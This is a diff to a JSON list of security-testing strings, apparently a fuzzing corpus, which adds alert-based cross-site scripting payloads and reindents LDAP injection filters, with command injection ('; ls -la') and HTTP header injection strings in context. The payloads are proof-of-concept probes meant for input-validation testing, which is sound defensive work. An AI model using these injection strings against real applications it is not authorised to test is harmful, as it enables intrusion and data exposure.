@@ -37,7 +37,18 @@
       "<iframe src='javascript:alert(1)'>",
       "<marquee onstart=alert('XSS')>",
       "'\"><script>alert('XSS')</script>",
-      "<IMG SRC=\"javascript:alert('XSS');\">"
+      "<IMG SRC=\"javascript:alert('XSS');\">",
+      "<input onfocus=alert('XSS') autofocus>",
+      "<select onfocus=alert('XSS') autofocus>",
+      "<textarea onfocus=alert('XSS') autofocus>",
+      "<video><source onerror=\"alert('XSS')\">",
+      "<audio src=x onerror=alert('XSS')>",
+      "<details open ontoggle=alert('XSS')>",
+      "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>",
+      "<object data=\"javascript:alert('XSS')\">",
+      "<embed src=\"javascript:alert('XSS')\">",
+      "'-alert(1)-'",
+      "\"><img src=x onerror=alert(String.fromCharCode(88,83,83))>"
     ],
     "command_injection": [
       "; ls -la",
@@ -90,7 +101,7 @@
       "٩(-̮̮̃-̃)۶ ٩(●̮̮̃•̃)۶",
       "‪‪test‪",
       "\u0000",
-      "\uFFFF",
+      "￿",
       "🐱",
       "👨‍👩‍👧‍👦",
       "🏳️‍🌈"
@@ -116,8 +127,8 @@
       "\t",
       "\n",
       "\r\n",
-      "\u00A0",
-      "\u2003"
+      " ",
+      " "
     ],
     "header_injection": [
       "\\r\\nContent-Length: 0\\r\\n",
@@ -135,29 +146,28 @@
       ";Content-Length: 0",
       ",Content-Length: 0"
     ],
-   "ldap_injection": [
-     "*",
-     "*)(uid=*",
-     "*((uid=*",
-     "admin*",
-     "*)(objectClass=*",
-     "admin)(&(password=*",
-     "*((uid=admin",
-     "*)(&(objectClass=*",
-     "admin)(&(uid=*",
-     "*)(uid=admin)(|(uid=*))",
-
-     "*)()",
-     "*)(cn=*)",
-     "*)(|(cn=admin))",
-     "*)(&(cn=*)(sn=*))",
-     "*)(|(objectClass=person))",
-     "*)(&(uid=*)(cn=admin*))",
-     "*)(|(uid=*)(!(uid=*)))",
-     "*)(&(mail=*)(uid=*))",
-     "*)(|(samAccountName=*))",
-     "*)(&(objectCategory=person)(cn=*))"
-  ]
+    "ldap_injection": [
+      "*",
+      "*)(uid=*",
+      "*((uid=*",
+      "admin*",
+      "*)(objectClass=*",
+      "admin)(&(password=*",
+      "*((uid=admin",
+      "*)(&(objectClass=*",
+      "admin)(&(uid=*",
+      "*)(uid=admin)(|(uid=*))",
+      "*)()",
+      "*)(cn=*)",
+      "*)(|(cn=admin))",
+      "*)(&(cn=*)(sn=*))",
+      "*)(|(objectClass=person))",
+      "*)(&(uid=*)(cn=admin*))",
+      "*)(|(uid=*)(!(uid=*)))",
+      "*)(&(mail=*)(uid=*))",
+      "*)(|(samAccountName=*))",
+      "*)(&(objectCategory=person)(cn=*))"
+    ]
   },
   "notes": [
     "Use these strings for security testing only",
